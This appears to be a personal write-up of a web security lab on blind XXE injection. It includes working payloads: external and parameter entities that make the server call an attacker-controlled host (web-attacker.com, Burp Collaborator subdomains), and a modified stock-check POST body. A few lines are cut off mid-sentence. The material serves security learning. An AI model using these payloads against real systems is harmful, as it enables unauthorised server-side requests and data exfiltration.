# Blind XXE with out-of-band interaction
Blind XXE vulnerabilities arise where the application is vulnerable to XXE injection but does not return the values of any defined external entities within its responses

You can trigger out-of-band network interactions, sometimes exfiltrating sensitive data within the interaction data.
You can trigger XML parsing errors in such a way that the error messages contain sensitive 

out-of-band network interaction to a system that you control. For example, you would define an external entity as follows:
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>

You would then make use of the defined entity in a data value within the XML.

This XXE attack causes the server to make a back-end HTTP request to the specified URL. The attacker can monitor for the resulting DNS lookup and HTTP request, and thereby detect that the XXE attack was successful.


Sometimes, XXE attacks using regular entities are blocked, due to some input validation by the application or some hardening of the XML parser that is being used. In this situation, you might be able to use XML parameter entities instead. XML parameter entities are a special kind of XML entity which can only be referenced elsewhere within the DTD. For present purposes, you only need to know two things. First, the declaration of an XML parameter entity includes the percent character before the entity name:
<!ENTITY % myparameterentity "my parameter entity value" >

This means that you can test for blind XXE using out-of-band detection via XML parameter entities as follows:
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>

This XXE payload declares an XML parameter entity called xxe and then uses the entity within the DTD. This will cause a DNS lookup and HTTP request to the attacker's domain, verifying that the attack was successful.


First step I used burp collaborator 
wrrcbbhahix1cj0c7k0s7vp3eukk89.burpcollaborator.net

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "1xzhhgnfnn36io6hdp6xd0v8kzqqef.burpcollaborator.net"> ]>


From this I was able to receive http requests after modifying the following POST request to the /product/stock HTTP/1.1 section:

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://1xzhhgnfnn36io6hdp6xd0v8kzqqef.burpcollaborator.net"> ]>
<stockCheck><productId>&xxe;</productId><storeId>2</storeId></stockCheck>
